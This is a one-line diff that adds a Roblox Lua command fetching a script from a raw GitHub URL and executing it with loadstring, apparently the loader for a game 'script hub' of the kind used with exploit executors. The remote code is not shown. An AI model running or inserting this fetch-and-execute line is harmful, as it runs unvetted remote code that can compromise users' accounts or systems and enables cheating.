@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cjsarmientocjsarmiento832/idk/refs/heads/main/alyahub"))()
